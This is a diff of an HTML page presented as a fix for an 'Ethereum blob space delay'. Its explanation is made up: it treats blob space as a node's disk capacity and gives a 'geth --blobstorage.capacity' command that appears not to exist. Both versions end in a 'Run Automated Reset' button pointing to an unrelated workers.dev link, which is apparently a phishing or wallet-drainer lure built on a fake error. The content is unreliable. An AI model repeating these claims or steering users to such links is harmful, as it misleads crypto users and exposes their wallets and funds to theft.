@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,29 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed transactions and high gas fees on the Ethereum network, with error messages indicating a "blob space delay" or similar issues, resulting in slow processing times for their transactions.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating an Ethereum blob space delay. This issue manifests as increased transaction processing times, causing inconvenience to users relying on timely transaction confirmations.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to the Ethereum network's limitations in handling large amounts of data, particularly with the introduction of blob-related transactions, which consume more space on the blockchain and slow down the verification process.</li>
+<li>The error occurs due to the limited capacity of the Ethereum blob space, which is responsible for storing and managing large data blobs associated with transactions. When the blob space reaches its capacity, new transactions are delayed until space is freed up, leading to a backlog of unprocessed transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transactions: <code>eth_estimateGas</code></li>
-<li>Use a third-party service to batch transactions and reduce network load: </li>
+<li>Increase the Ethereum node's blob space capacity to accommodate more data:</li>
+<li>Update node configuration to allocate more disk space for blob storage</li>
+<li>Implement a blob caching mechanism to reduce storage requirements</li>
+<li>Run the following command to increase the blob space capacity:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;0x...&quot;}],&quot;id&quot;:1}&#39;</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--blobstorage.capacity<span class="w"> </span><span class="m">1024</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console for more complex configuration adjustments. </p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Configure a local Ethereum node to manually manage transaction verification and gas pricing</li>
+<li>Ethereum node (geth) installed and running</li>
+<li>Sufficient disk space available for blob storage</li>
+<li>Basic understanding of Ethereum node configuration and management</li>
 </ul>
-<p>Prerequisites:
-* An Ethereum wallet with a sufficient balance
-* A basic understanding of Ethereum transaction mechanics
-* Access to a reliable Ethereum node or third-party service</p>
-<p>Consider utilizing an external console to streamline the troubleshooting process and execute the above commands efficiently.</p>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
